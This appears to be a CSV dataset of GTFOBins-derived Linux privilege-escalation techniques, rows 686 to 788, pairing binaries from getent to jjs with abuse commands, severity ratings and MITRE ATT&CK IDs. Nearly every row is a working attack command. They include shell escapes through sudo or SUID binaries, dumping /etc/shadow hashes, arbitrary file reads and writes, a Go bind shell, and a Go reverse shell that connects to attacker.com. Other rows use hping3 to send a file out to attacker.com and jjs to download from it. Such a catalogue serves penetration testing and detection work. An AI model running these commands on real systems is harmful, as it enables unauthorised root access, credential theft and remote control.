686,Linux,getent shadow,Abuse the 'getent' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This allows to dump password hashes from the `/etc/shadow` file.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/getent/
687,Linux,getent shadow,Abuse the 'getent' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This allows to dump password hashes from the `/etc/shadow` file.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/getent/
688,Linux,"ghc -e 'System.Process.callCommand ""/bin/sh""'",Abuse the 'ghc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ghc/
689,Linux,"ghc -e 'System.Process.callCommand ""/bin/sh""'",Abuse the 'ghc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ghc/
690,Linux,"ghci System.Process.callCommand ""/bin/sh""",Abuse the 'ghci' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ghci/
691,Linux,"ghci System.Process.callCommand ""/bin/sh""",Abuse the 'ghci' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ghci/
692,Linux,gimp -idf --batch-interpreter=python-fu-eval -b '...',Abuse the 'gimp' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gimp/
693,Linux,gimp -idf --batch-interpreter=python-fu-eval -b '...',Abuse the 'gimp' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gimp/
694,Linux,ginsh !/bin/sh,Abuse the 'ginsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ginsh/
695,Linux,ginsh !/bin/sh,Abuse the 'ginsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ginsh/
696,Linux,ginsh !/bin/sh,Abuse the 'ginsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ginsh/
697,Linux,git diff /dev/null /path/to/input-file,Abuse the 'git' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is displayed in `diff` style output format.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/git/
698,Linux,git diff /dev/null /path/to/input-file,Abuse the 'git' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is displayed in `diff` style output format.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/git/
699,Linux,git diff /dev/null /path/to/input-file,Abuse the 'git' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is displayed in `diff` style output format.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/git/
700,Linux,git apply --unsafe-paths --directory / x.patch,Abuse the 'git' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The patch can be created locally by creating the file that will be written on the target using its absolute path: ``` echo DATA >/path/to/input-file git diff /dev/null /path/to/input-file >x.patch ```,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/git/
701,Linux,git apply --unsafe-paths --directory / x.patch,Abuse the 'git' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The patch can be created locally by creating the file that will be written on the target using its absolute path: ``` echo DATA >/path/to/input-file git diff /dev/null /path/to/input-file >x.patch ```,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/git/
702,Linux,git apply --unsafe-paths --directory / x.patch,Abuse the 'git' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The patch can be created locally by creating the file that will be written on the target using its absolute path: ``` echo DATA >/path/to/input-file git diff /dev/null /path/to/input-file >x.patch ```,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/git/
703,Linux,git help config,Abuse the 'git' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/git/
704,Linux,git help config,Abuse the 'git' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/git/
705,Linux,git branch --help config !/bin/sh,"Abuse the 'git' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. The help system can also be reached from any `git` command, e.g., `git branch`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/git/
706,Linux,git branch --help config !/bin/sh,"Abuse the 'git' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. The help system can also be reached from any `git` command, e.g., `git branch`.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/git/
707,Linux,"PAGER='/bin/sh -c ""exec sh 0<&1""' git -p help",Abuse the 'git' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/git/
708,Linux,"PAGER='/bin/sh -c ""exec sh 0<&1""' git -p help",Abuse the 'git' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/git/
709,Linux,git init . echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit chmod +x .git/hooks/pre-commit git -C . commit --allow-empty -m x,"Abuse the 'git' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/git/
710,Linux,git init . echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit chmod +x .git/hooks/pre-commit git -C . commit --allow-empty -m x,"Abuse the 'git' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/git/
711,Linux,ln -s /bin/sh git-x git --exec-path=. x,Abuse the 'git' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/git/
712,Linux,ln -s /bin/sh git-x git --exec-path=. x -p,Abuse the 'git' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/git/
713,Linux,ln -s /bin/sh git-x git --exec-path=. x,Abuse the 'git' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/git/
714,Linux,"gnuplot -e 'system(""/bin/sh 1>&0"")'",Abuse the 'gnuplot' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gnuplot/
715,Linux,"gnuplot -e 'system(""/bin/sh 1>&0"")'",Abuse the 'gnuplot' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gnuplot/
716,Linux,"gnuplot -e 'system(""/bin/sh 1>&0"")'",Abuse the 'gnuplot' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gnuplot/
717,Linux,"echo -e 'package main\nimport (\n\t""os""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/go/
718,Linux,"echo -e 'package main\nimport (\n\t""os""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/go/
719,Linux,"echo -e 'package main\nimport (\n\t""fmt""\n\t""os""\n)\n\nfunc main(){\n\tb, _ := os.ReadFile(""/path/to/input-file"")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/go/
720,Linux,"echo -e 'package main\nimport (\n\t""fmt""\n\t""os""\n)\n\nfunc main(){\n\tb, _ := os.ReadFile(""/path/to/input-file"")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/go/
721,Linux,"echo -e 'package main\nimport ""os""\nfunc main(){\n\tf, _ := os.OpenFile(""/path/to/output-file"", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte(""DATA\\n""))\n\tf.Close()\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/go/
722,Linux,"echo -e 'package main\nimport ""os""\nfunc main(){\n\tf, _ := os.OpenFile(""/path/to/output-file"", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte(""DATA\\n""))\n\tf.Close()\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/go/
723,Linux,"echo -e 'package main\nimport (\n\t""os""\n\t""net""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP(""attacker.com"").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/go/
724,Linux,"echo -e 'package main\nimport (\n\t""os""\n\t""net""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP(""attacker.com"").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/go/
725,Linux,"echo -e 'package main\nimport ""syscall""\nfunc main(){\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, []string{})\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/go/
726,Linux,"echo -e 'package main\nimport ""syscall""\nfunc main(){\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, []string{})\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",Abuse the 'go' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/go/
727,Linux,grc --pty /bin/sh,Abuse the 'grc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/grc/
728,Linux,grc --pty /bin/sh,Abuse the 'grc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/grc/
729,Linux,gtester DATA -o /path/to/output-file,"Abuse the 'gtester' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`).",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/gtester/
730,Linux,gtester DATA -o /path/to/output-file,"Abuse the 'gtester' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`).",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/gtester/
731,Linux,gtester DATA -o /path/to/output-file,"Abuse the 'gtester' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`).",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/gtester/
732,Linux,echo 'exec /bin/sh 0<&1' >/path/to/temp-file chmod +x /path/to/temp-file gtester -q /path/to/temp-file,Abuse the 'gtester' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gtester/
733,Linux,echo '#!/bin/sh -p' >/path/to/temp-file echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file chmod +x /path/to/temp-file gtester -q /path/to/temp-file,Abuse the 'gtester' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gtester/
734,Linux,echo 'exec /bin/sh 0<&1' >/path/to/temp-file chmod +x /path/to/temp-file gtester -q /path/to/temp-file,Abuse the 'gtester' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gtester/
735,Linux,"guile -c '(system ""/bin/sh"")'",Abuse the 'guile' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/guile/
736,Linux,"guile -c '(system ""/bin/sh"")'",Abuse the 'guile' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/guile/
737,Linux,"guile -c '(system ""/bin/sh"")'",Abuse the 'guile' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/guile/
738,Linux,gzip -c /path/to/input-file | gzip -d,Abuse the 'gzip' binary (file read) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gzip/
739,Linux,gzip -c /path/to/input-file | gzip -d,Abuse the 'gzip' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gzip/
740,Linux,gzip -c /path/to/input-file | gzip -d,Abuse the 'gzip' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gzip/
741,Linux,gzip -c /path/to/input-file | gzip -d,Abuse the 'gzip' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/gzip/
742,Linux,echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist,"Abuse the 'hashcat' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Append data to the end of the output file, creating if does not exist.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/hashcat/
743,Linux,echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist,"Abuse the 'hashcat' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Append data to the end of the output file, creating if does not exist.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/hashcat/
744,Linux,head -c-0 /path/to/input-file,Abuse the 'head' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/head/
745,Linux,head -c-0 /path/to/input-file,Abuse the 'head' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/head/
746,Linux,head -c-0 /path/to/input-file,Abuse the 'head' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/head/
747,Linux,hd /path/to/input-file,Abuse the 'hexdump' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The output is actually an hex dump.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/hexdump/
748,Linux,hd /path/to/input-file,Abuse the 'hexdump' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The output is actually an hex dump.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/hexdump/
749,Linux,hd /path/to/input-file,Abuse the 'hexdump' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The output is actually an hex dump.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/hexdump/
750,Linux,hg --config alias.x='!/bin/sh' x,Abuse the 'hg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/hg/
751,Linux,hg --config alias.x='!/bin/sh' x,Abuse the 'hg' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/hg/
752,Linux,hg --config alias.x='!/bin/sh' x,Abuse the 'hg' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/hg/
753,Linux,highlight --no-doc --failsafe /path/to/input-file,Abuse the 'highlight' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/highlight/
754,Linux,highlight --no-doc --failsafe /path/to/input-file,Abuse the 'highlight' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/highlight/
755,Linux,highlight --no-doc --failsafe /path/to/input-file,Abuse the 'highlight' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/highlight/
756,Linux,hping3 /bin/sh,Abuse the 'hping3' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/hping3/
757,Linux,hping3 /bin/sh -p,Abuse the 'hping3' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/hping3/
758,Linux,hping3 /bin/sh,Abuse the 'hping3' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/hping3/
759,Linux,hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file,"Abuse the 'hping3' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/hping3/
760,Linux,iconv -f 8859_1 -t 8859_1 /path/to/input-file,Abuse the 'iconv' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/iconv/
761,Linux,iconv -f 8859_1 -t 8859_1 /path/to/input-file,Abuse the 'iconv' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/iconv/
762,Linux,iconv -f 8859_1 -t 8859_1 /path/to/input-file,Abuse the 'iconv' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/iconv/
763,Linux,echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file,Abuse the 'iconv' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/iconv/
764,Linux,echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file,Abuse the 'iconv' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/iconv/
765,Linux,echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file,Abuse the 'iconv' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/iconv/
766,Linux,iftop !/bin/sh,Abuse the 'iftop' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires the privilege to capture on some device (specify with `-i` if needed).,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/iftop/
767,Linux,iftop !/bin/sh,Abuse the 'iftop' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This requires the privilege to capture on some device (specify with `-i` if needed).,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/iftop/
768,Linux,iftop !/bin/sh,Abuse the 'iftop' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires the privilege to capture on some device (specify with `-i` if needed).,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/iftop/
769,Linux,install -m 6777 /path/to/input-file /path/to/output-dir/,"Abuse the 'install' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/install/
770,Linux,install -m 6777 /path/to/input-file /path/to/output-dir/,"Abuse the 'install' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/install/
771,Linux,ionice /bin/sh,Abuse the 'ionice' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ionice/
772,Linux,ionice /bin/sh -p,Abuse the 'ionice' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ionice/
773,Linux,ionice /bin/sh,Abuse the 'ionice' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ionice/
774,Linux,ip -force -batch /path/to/input-file,Abuse the 'ip' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ip/
775,Linux,ip -force -batch /path/to/input-file,Abuse the 'ip' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ip/
776,Linux,ip -force -batch /path/to/input-file,Abuse the 'ip' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ip/
777,Linux,ip netns add foo ip netns exec foo /bin/sh ip netns delete foo,Abuse the 'ip' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ip/
778,Linux,ip netns add foo ip netns exec foo /bin/sh -p ip netns delete foo,Abuse the 'ip' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ip/
779,Linux,ip netns add foo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar ip netns exec bar /bin/sh ip netns delete foo ip netns delete bar,Abuse the 'ip' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ip/
780,Linux,iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA iptables -S iptables-save -f /path/to/output-file,Abuse the 'iptables-save' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The content is written along with a number of `iptables` rules.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/iptables-save/
781,Linux,irb ...,Abuse the 'irb' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/irb/
782,Linux,irb ...,Abuse the 'irb' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/irb/
783,Linux,ispell /etc/hosts !/bin/sh,Abuse the 'ispell' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ispell/
784,Linux,ispell /etc/hosts !/bin/sh -p,Abuse the 'ispell' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ispell/
785,Linux,ispell /etc/hosts !/bin/sh,Abuse the 'ispell' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ispell/
786,Linux,java Shell,"Abuse the 'java' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `Shell.class` class file can be compiled offline, then uploaded to the target: ``` cat >Shell.java <<EOF public class Shell { public static void main(String[] args) throws Exception { new ProcessBuilder(""/bin/sh"").inheritIO().start().waitFor(); } } EOF javac Shell.java ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/java/
787,Linux,java Shell,"Abuse the 'java' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `Shell.class` class file can be compiled offline, then uploaded to the target: ``` cat >Shell.java <<EOF public class Shell { public static void main(String[] args) throws Exception { new ProcessBuilder(""/bin/sh"").inheritIO().start().waitFor(); } } EOF javac Shell.java ```",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/java/
788,Linux,"jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.newChannel(ws.openStream()); var FileOutputStream = Java.type('java.io.FileOutputStream'); var fos = new FileOutputStream('/path/to/output-file'); fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE); fos.close(); rbc.close();",Abuse the 'jjs' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/jjs/
